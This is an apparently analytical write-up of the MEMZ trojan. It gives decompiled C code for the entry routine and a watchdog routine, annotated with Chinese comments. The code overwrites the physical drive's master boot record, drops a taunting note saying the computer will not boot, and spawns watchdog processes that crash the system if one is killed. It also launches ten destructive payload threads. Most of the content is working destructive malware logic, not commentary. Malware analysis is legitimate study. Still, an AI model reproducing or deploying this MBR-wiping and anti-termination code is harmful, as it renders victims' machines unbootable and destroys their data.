# start-F5-MEMZ Virus

void __noreturn start()
{
  const WCHAR *v0; // eax@1
  LPWSTR *v1; // eax@1
  HANDLE v2; // ebx@6
  unsigned int v3; // edi@8
  _BYTE *v4; // esi@8
  _BYTE *v5; // ecx@8
  unsigned int v6; // ecx@10
  HANDLE v7; // esi@14
  unsigned int v8; // edi@18
  int (__cdecl **v9)(int); // esi@18
  WCHAR *v10; // esi@23
  signed int v11; // edi@23
  SHELLEXECUTEINFOW pExecInfo; // [sp+Ch] [bp-64h]@3
  MSG Msg; // [sp+48h] [bp-28h]@4
  DWORD NumberOfBytesWritten; // [sp+64h] [bp-Ch]@12
  HANDLE hObject; // [sp+68h] [bp-8h]@6
  int pNumArgs; // [sp+6Ch] [bp-4h]@1

  dword_405184 = GetSystemMetrics(0);
  dword_405188 = GetSystemMetrics(1);
  v0 = GetCommandLineW();
  v1 = CommandLineToArgvW(v0, &pNumArgs);
  if ( pNumArgs > 1 )
  {
    if ( !lstrcmpW(v1[1], L"/watchdog") )
    {
      // 创建线程并检测线程状况
      CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_40114A, 0, 0, 0);// 经过分析，sub40114A是创建进程并且产生大量无关窗口，最后导致关机的函数
      pExecInfo.lpVerb = (LPCWSTR)48;
      pExecInfo.lpParameters = (LPCWSTR)sub_401000;// 回调sub40114a中的关机功能
      pExecInfo.u.hIcon = "hax";
      pExecInfo.lpFile = 0;
      pExecInfo.lpDirectory = 0;
      pExecInfo.nShow = 0;
      pExecInfo.hInstApp = 0;
      pExecInfo.lpIDList = 0;
      pExecInfo.lpClass = 0;
      pExecInfo.hkeyClass = 0;
      pExecInfo.dwHotKey = 0;
      pExecInfo.hProcess = 0;
      RegisterClassExA((const WNDCLASSEXA *)&pExecInfo.lpVerb);
      CreateWindowExA(0, "hax", 0, 0, 0, 0, 100, 100, 0, 0, 0, 0);
      while ( GetMessageW(&Msg, 0, 0, 0) > 0 )
      {
        TranslateMessage(&Msg);
        DispatchMessageW(&Msg);
      }                                         // 消息循环
    }
    v2 = CreateFileA("\\\\.\\PhysicalDrive0", 0xC0000000, 3u, 0, 3u, 0, 0);// MBR部分
    hObject = v2;
    if ( v2 == (HANDLE)-1 )
      ExitProcess(2u);
    v3 = 0;
    v4 = LocalAlloc(0x40u, 0x10000u);
    v5 = v4;
    do
    {
      ++v3;
      *v5 = v5["秽\a幟庅" - v4];         // 写入304字节代码
      ++v5;
    }
    while ( v3 < 0x12F );
    v6 = 0;
    do
    {
      v4[v6 + 510] = byte_402248[v6];
      ++v6;
    }
    while ( v6 < 0x7A0 );
    if ( !WriteFile(v2, v4, 0x10000u, &NumberOfBytesWritten, 0) )// 写txt文件来弹出
      ExitProcess(3u);
    CloseHandle(hObject);
    v7 = CreateFileA("\\note.txt", 0xC0000000, 3u, 0, 2u, 0x80u, 0);
    if ( v7 == (HANDLE)-1 )
      ExitProcess(4u);
    if ( !WriteFile(
            v7,
            "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n"
            "\r\n"
            "Your computer won't boot up again,\r\n"
            "so use it as long as you can!\r\n"
            "\r\n"
            ":D\r\n"
            "\r\n"
            "Trying to kill MEMZ will cause your system to be\r\n"
            "destroyed instantly, so don't try it :D",
            0xDAu,
            &NumberOfBytesWritten,
            0) )
      ExitProcess(5u);
    CloseHandle(v7);
    ShellExecuteA(0, 0, "notepad", "\\note.txt", 0, 10);// 执行
    v8 = 0;
    v9 = &off_405130;                           // 存了函数名以及调用时间
    do
    {
      Sleep((DWORD)v9[1]);
      CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401A2B, v9, 0, 0);// 依次调用10个函数
      ++v8;
      v9 += 2;
    }                                           // 一个结构体，用来调用10个不同函数搞破坏
    while ( v8 < 10 );
    while ( 1 )
      Sleep(10000u);
  }
  if ( MessageBoxA(
         0,
         "The software you just executed is considered malware.\r\n"
         "This malware will harm your computer and makes it unusable.\r\n"
         "If you are seeing this message without knowing what you just executed, simply press No and nothing will happen."
         "\r\n"
         "If you know what this malware does and are using a safe environment to test, press Yes to start it.\r\n"
         "\r\n"
         "DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?",
         "MEMZ",
         0x34u) == 6
    && MessageBoxA(
         0,
         "THIS IS THE LAST WARNING!\r\n"
         "\r\n"
         "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n"
         "STILL EXECUTE IT?",
         "MEMZ",
         0x34u) == 6 )
  {
    v10 = (WCHAR *)LocalAlloc(0x40u, 0x4000u);
    GetModuleFileNameW(0, v10, 0x2000u);
    v11 = 5;
    do
    {
      ShellExecuteW(0, 0, v10, L"/watchdog", 0, 10);// 看来这个watchdog就是感染程序了，目的是生成5个进程
      --v11;
    }
    while ( v11 );
    pExecInfo.cbSize = 60;                      // 这里调用了ShellExecute API
    pExecInfo.lpFile = v10;
    pExecInfo.lpParameters = L"/main";          // 以main为参数生成一个MEMZ进程
    pExecInfo.fMask = 64;
    pExecInfo.hwnd = 0;
    pExecInfo.lpVerb = 0;
    pExecInfo.lpDirectory = 0;
    pExecInfo.hInstApp = 0;
    pExecInfo.nShow = 10;
    ShellExecuteExW(&pExecInfo);
    SetPriorityClass(pExecInfo.hProcess, 0x80u);
  }
  ExitProcess(0);
}



## sub_40114A

void __stdcall __noreturn sub_40114A(LPVOID lpThreadParameter)
{
  HANDLE v1; // eax@1
  HANDLE v2; // edi@2
  const CHAR *v3; // ebx@2
  int v4; // esi@2
  PROCESSENTRY32W pe; // [sp+Ch] [bp-23Ch]@2
  LPCSTR lpString1; // [sp+238h] [bp-10h]@1
  int v7; // [sp+23Ch] [bp-Ch]@1
  LPCSTR lpString2; // [sp+240h] [bp-8h]@3
  HANDLE hProcess; // [sp+244h] [bp-4h]@3

  v7 = 0;
  lpString1 = (LPCSTR)LocalAlloc(0x40u, 0x200u);
  v1 = GetCurrentProcess();
  GetProcessImageFileNameA(v1, (LPSTR)lpString1, 0x200u);// 获取当前进程的一些信息
                                                // 
  Sleep(0x3E8u);
  while ( 1 )                                   // 这个while循环保证一直在检测恶意进程
  {
    v2 = CreateToolhelp32Snapshot(2u, 0);
    pe.dwSize = 556;
    Process32FirstW(v2, &pe);
    v3 = lpString1;
    v4 = 0;
    do
    {
      hProcess = OpenProcess(0x400u, 0, pe.th32ProcessID);
      lpString2 = (LPCSTR)LocalAlloc(64u, 512u);
      GetProcessImageFileNameA(hProcess, (LPSTR)lpString2, 512u);
      if ( !lstrcmpA(v3, lpString2) )
        ++v4;
      CloseHandle(hProcess);
      LocalFree((HLOCAL)lpString2);
    }                                           // 此处给v5计数，也就是给创建的恶意进程计数
    while ( Process32NextW(v2, &pe) );
    CloseHandle(v2);
    if ( v4 < v7 )
      sub_401021();                             // 少一个进程就直接蓝屏
    v7 = v4;
    Sleep(0xAu);
  }
}